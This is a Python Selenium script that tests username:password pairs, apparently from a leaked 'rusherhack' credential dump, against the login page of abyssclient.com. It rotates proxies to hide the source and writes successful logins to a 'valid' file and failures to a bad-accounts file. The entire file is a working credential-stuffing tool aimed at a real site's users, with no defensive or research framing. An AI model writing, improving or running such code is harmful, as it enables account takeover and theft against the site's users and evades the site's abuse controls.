from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import time
import random

from checkers.util.main.util import split_string, proxy_file


def get_proxy_from_file(proxy_file2):
    with open(proxy_file2, 'r') as f2:
        proxies = f2.readlines()
    return random.choice(proxies).strip()


with open('../txt/output_rusherhack.txt', 'r') as file:
    input_str = file.read()

credentials_list = split_string(input_str)

saved_credentials = []
bad_credentials = []

options = Options()
driver = None

for username, password in credentials_list:
    if driver is None:
        proxy = get_proxy_from_file(proxy_file)
        proxy_dict = {"proxy": proxy}
        options.add_argument("--proxy-server={}".format(proxy))
        driver = webdriver.Firefox(options=options)

    driver.get('https://abyssclient.com/web/')
    time.sleep(0.5)

    try:
        username_field = driver.find_element(By.NAME, 'username')
        password_field = driver.find_element(By.NAME, 'password')
        submit_button = driver.find_element(By.XPATH, "//input[@type='submit']")

        username_field.send_keys(username)
        password_field.send_keys(password)
        submit_button.click()

        time.sleep(0.5)

        if "https://abyssclient.com/web/profile" in driver.current_url:
            saved_credentials.append((username, password))
            print(f"Credentials saved: {username}:{password}")
            with open('../valid_rusherhack.txt', 'a') as f:
                f.write(f"{username}:{password}\n")
        else:
            with open('../txt/badaccs_rusherhack.txt', 'a') as b:
                b.write(f"{username}:{password}\n")
    except Exception as e:
        print(f"Error encountered for {username}:{password}: {e}")

        if username == credentials_list[-1] or e:
            driver.quit()
